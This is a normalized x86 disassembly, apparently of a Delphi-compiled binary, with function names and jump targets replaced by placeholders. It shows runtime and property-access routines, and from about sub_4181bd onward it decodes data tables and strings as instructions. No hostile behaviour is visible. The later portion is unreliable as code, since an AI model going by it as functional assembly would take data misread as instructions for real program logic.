cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4168e4
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_416940
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_416870
mov edx eax
mov ecx edi
mov eax [ ebx ]
mov eax [ eax ]
call sub_416640
pop edi
pop esi
pop ebx
retn
sub_416964
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
mov edx esi
call sub_416764
test eax eax
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_4168e4
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_4169b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_416870
mov edx eax
mov ecx ebx
mov eax edi
call sub_4169e0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4169e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_416a94
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
mov eax [ ebp - 0x4 ]
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_416634
mov eax [ eax + 0x1 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
xor ebx ebx
jae r-xdata
bt edi eax
inc ebx
cmp ebx 0x20
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax ebx
cmp eax 0x1f
ja r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_416640
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4042d0
mov eax esi
mov edx r-xdata
call sub_4042d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a9b
lea eax [ ebp - 0x10 ]
call sub_404008
retn
push r-xdata
push [ esi ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_404388
sub_416ac8
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
test al al
je r-xdata
mov eax edx
mov edx [ esi ]
mov ecx ebx
call sub_4040f8
jmp r-xdata
sub al 0x20
je r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
sub al 0x20
je r-xdata
sub al 0xc
je r-xdata
inc ebx
sub al 0xc
je r-xdata
sub al 0x31
jne r-xdata
sub al 0x31
je r-xdata
inc ebx
add [ esi ] ebx
pop esi
pop ebx
retn
sub_416b0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_416bd3
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416bda
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax edi
call sub_4044c8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x20
je r-xdata
inc [ ebp - 0x4 ]
sub al 0x3b
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_416634
mov eax [ eax + 0x1 ]
mov edi [ eax ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_416ac8
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_416764
mov ebx eax
test ebx ebx
jge r-xdata
cmp ebx 0x1f
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_416ac8
bts esi ebx
sub_416be4
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx edi
mov eax ebx
call sub_416b0c
mov ecx eax
mov edx ebx
mov eax esi
call sub_4168e4
pop edi
pop esi
pop ebx
retn
sub_416c08
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_416c4c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416cc8
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4042a4
mov ecx esp
mov edx esi
mov eax ebx
call sub_416c4c
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_416d10
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_416cfc
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_416d50
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_416cfc
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_416d90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416dd8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_416eac
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ddf
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_416de8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416e30
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404860
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_416f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e37
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_416e40
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416ca0
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_416d10
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_416d90
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_404008
pop ebx
retn
sub_416e80
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_416cc8
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_416d50
pop ebx
retn
dec bl
je r-xdata
call sub_416de8
jmp r-xdata
pop ebx
retn
sub_416eac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416f84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_416e40
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404860
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f8b
lea eax [ ebp - 0x10 ]
call sub_404008
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404750
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404714
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_416f94
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41705a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404290
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_416e80
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417061
lea eax [ ebp - 0xc ]
call sub_404008
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404750
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_417068
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_416634
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_4170a8 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_416634
cmp [ eax ] 0x4
jne r-xdata
sub_417180
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_416634
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_4171c8 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4172f7 ]
jmp [ eax * 4 + jump_table_417264 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_41738c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_417378
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4173cc
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_417378
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41740c
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_417444
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_41746c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4174a8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405a50
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_41751c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_417562
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417569
retn
mov eax rw-data
call sub_404008
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404abc
sub_417874
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_417899
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178a0
retn
sub_4181bd
cdq
add [ ecx ] sub_4181a7
mov cl 0x81
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov ebp 0x8004181
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x7dc7ffc0 ] cl
inc ecx
add cl cl
add [ ecx ] 0x0
dec eax
add [ ecx ] 0x74
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7e ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
cld
add [ ecx ] 0x7c
xor al 0x40
add [ eax ] cl
lodsb [ esi ]
inc ecx
add [ esp + esi + 0x34900040 ] cl
inc eax
add [ esp + esi + 0x31cc0040 ] al
inc eax
add al ch
xor [ eax ] eax
cmp [ edx - 0x54b7ffbf ] ch
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
add [ eax + 0xe0041ac ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40 ] bh
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
cld
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xfffffffff441c31a
lodsd [ esi ]
inc ecx
add [ eax - 0x55 ] cl
inc ecx
add [ eax - 0x55 ] dl
inc ecx
add [ edx + ebp * 4 + 0x41 ] ah
add [ eax - 0x52 ] ah
imul esi [ ebx + 0x74 ] 0x74746e65
add [ ecx ] 0x7
adc eax 0x746e4954
jb r-xdata
add al ch
xor [ eax ] eax
hlt
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add [ eax - 0x51 ] al
inc ecx
add [ eax - 0x51 ] dh
inc ecx
add [ eax - 0x51 ] ch
inc ecx
add [ ebp + ebp * 4 + 0x20041 ] bh
pushad
scasb [ edi ]
imul esi [ ebx + 0x74 ] 0x38746e65
add [ ecx ] 0x70
add [ ecx ] 0x43070000
insb
popad
jae r-xdata
jae r-xdata
add [ ecx ] 0x7c
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x83
inc ecx
add [ edx ] bl
add [ ecx ] 0xc
add [ eax ] al
add ah bh
sub_418394
add [ eax ] al
dec ecx
je r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
test [ ecx ] al
jl r-xdata
mov eax eax
fadd [ ebx + 0x41 ]
insd
mov eax eax
xor [ ebx + 0xf070041 ] al
push esp
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x7c ] ch
inc ecx
add [ eax ] dl
add [ eax ] al
add ah bh
insd
in al dx
add [ ecx ] 0x70
add [ ecx ] 0x43070000
insb
popad
jae r-xdata
jae r-xdata
add [ ebp - 0x7ca3ffc0 ] cl
inc ecx
add [ edi ] cl
cmovns edx [ ebx + 0x74 ]
jb r-xdata
add ah cl
xor [ eax ] eax
call 0xfffffffff441c40a
mov al 0x41
add [ eax - 0x55 ] cl
inc ecx
test [ eax + eax * 2 ] dh
outsb
jae r-xdata
add [ ecx ] 0x7c
xor al 0x40
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
test [ ecx ] al
adc [ eax ] al
add [ eax ] al
cld
popad
jo r-xdata
add [ ebx + esi * 4 ] ch
inc ecx
add [ edx + esi * 4 ] ah
inc ecx
add [ edx + ebp ] ch
jb r-xdata
inc eax
add [ eax + 0x2c0041b5 ] dh
sub al [ eax ]
mov eax 0x100041b5
mov dh 0x41
adc [ eax ] eax
add [ edi + ebp ] esi
pushfd
jae r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4307da82
insb
popad
jae r-xdata
add [ edx + edi * 4 - 0x451fffbf ] ch
inc ecx
add [ eax - 0x44 ] cl
inc ecx
add al dl
mov esp 0xbd900041
inc ecx
add [ eax ] bl
mov esi 0xb1240041
inc ecx
add [ eax - 0x4f ] cl
inc ecx
add [ ecx + esi * 4 + 0x41 ] ch
add [ edx + ebp ] ch
inc eax
add [ edx + ebp ] ch
inc eax
add al cl
mov ah 0x41
add [ ebp + esi * 4 - 0x48c7ffbf ] bh
inc ecx
add ah al
mov bh 0x41
add [ eax + 0x2c0041b8 ] bl
sub al [ eax ]
int3
jae r-xdata
add [ eax ] al
dec [ ebx + 0x4183dcc0 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax * 4 + 0x41 ] bl
add [ esp + eax * 4 + 0x41 ] bh
add bh bh
sub_4184a0
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
sub al 0xb3
inc ecx
outsb
dec ecx
je r-xdata
add [ edx + esi * 4 ] ah
inc ecx
add [ eax ] al
rol [ ecx ] 0x34
rol [ ecx ] 0x38
rol [ ecx ] 0x3c
rol [ ecx ] 0x10
mov dh 0x41
add [ eax + 0xc0041c2 ] dh
retn
mov bl 0x41
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
int3
sub_418536
inc ecx
add al dl
mov esp 0xc41c0041
inc ecx
add [ eax - 0x4bffbe3c ] dl
mov esi 0xbec00041
inc ecx
add [ ecx + esi * 4 + 0x41 ] ch
add [ edi + edi * 4 + 0x41 ] bl
add [ edi + edi * 4 - 0x3ff7ffbf ] bl
inc ecx
add [ ebp + esi * 4 - 0x3e67ffbf ] bh
inc ecx
add ah al
mov bh 0x41
add [ eax - 0x2bffbe48 ] bl
rol [ ecx ] 0xe4
rol [ ecx ] 0xfc
mov eax 0xb9500041
inc ecx
add ah bh
mov ecx 0xbb940041
inc ecx
add ah ch
mov ebx 0xbc800041
inc ecx
add [ edi + edi * 4 ] ah
inc ecx
add [ eax - 0x41 ] al
inc ecx
add [ eax ] bh
retn 0x41
sub_41870c
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi + 0x80041 ] al
add [ eax ] al
dec eax
xchg [ ecx ] al
jl r-xdata
inc ecx
add [ ecx + ecx * 8 ] ah
inc ecx
add [ eax ] bh
leave
inc ecx
add al bl
enter 0x41 0xe8
enter 0x41 0xe4
lds eax [ ecx ]
clc
enter 0x41 0xb
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
insd
add [ edi + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 + 0x100041 ] bl
inc ecx
add al bh
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0xfffffffff841c73a
0x41
add [ eax ] al
fadd [ ebp + 0x347c0041 ]
inc eax
add [ eax - 0x73ffbfcc ] cl
xor al 0x40
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah cl
xor [ eax ] eax
call 0x2441c7ae
xor al [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
